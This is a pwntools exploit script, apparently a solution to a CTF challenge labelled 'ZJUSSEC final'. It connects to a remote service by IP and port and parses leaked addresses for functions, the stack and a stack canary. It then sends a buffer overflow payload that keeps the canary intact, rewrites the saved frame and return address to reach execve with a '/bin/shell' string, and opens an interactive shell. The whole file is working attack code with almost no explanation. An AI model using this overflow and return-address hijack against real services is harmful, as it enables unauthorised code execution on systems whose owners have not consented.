from pwn import *
# context.log_level = 'debug'

# conn = process("./start_qemu.sh")
conn = remote("47.99.80.189", 10002)

conn.recvuntil('----------------------- [ ZJUSSEC final ] -----------------------')

conn.recvuntil('The addr of hear is: ')
receive = conn.recvline()[:-4]
hear_addr = int(receive,16)

conn.recvuntil('The addr of gift is: ')
receive = conn.recvline()[:-4]
gift_addr = int(receive,16)

conn.recvuntil('The addr of execve is: ')
receive = conn.recvline()[:-4]
execve_addr = int(receive,16)

conn.recvuntil('The addr of stack is ')
receive = conn.recvline()[:-4]
stack_addr = int(receive,16)

conn.recvuntil('[?] Are you smiling right now? (y/n)')
conn.sendline('y')
conn.recvuntil('[!] here is a gift for smiling: ')
receive = conn.recvline()[:-4]
cannary_value = int(receive,16) # b'1225365c'

conn.recvuntil('[ ] Now Reading:')
payload = b'a'*4

# r4 s1 fp pc
fp = stack_addr + 24 - 20 + 8
r4 = fp - 12
# conn.sendline(b'/bin/shell\x00\x00'+p32(gift_addr+64)+p32(stack_addr + 24 - 16 - 40 + 4)+p32(0)+p32(0)+p32(execve_addr)+p32(cannary_value)+p32(r4)+ b'abcd'+p32(fp)+p32(hear_addr+40))
conn.sendline(b'/bin/shell\x00\x00'+p32(gift_addr+64) +p32(stack_addr + 24 - 16 - 32 + 4 - 32)+p32(0)+  p32(gift_addr+68)+ p32(execve_addr)+p32(cannary_value)+p32(gift_addr+68)+ p32(0)+p32(0)+p32(gift_addr+68))
# conn.sendline(b'/bin/shell\x00\x00'+payload+p32(cannary_value)+p32(stack_addr + 24 - 16 - 40 + 4)+ p32(0)+p32(0)+p32(gift_addr+68))
# conn.sendline(payload+p32(cannary_value)+b'a'*16)
# conn.recvline()
conn.interactive()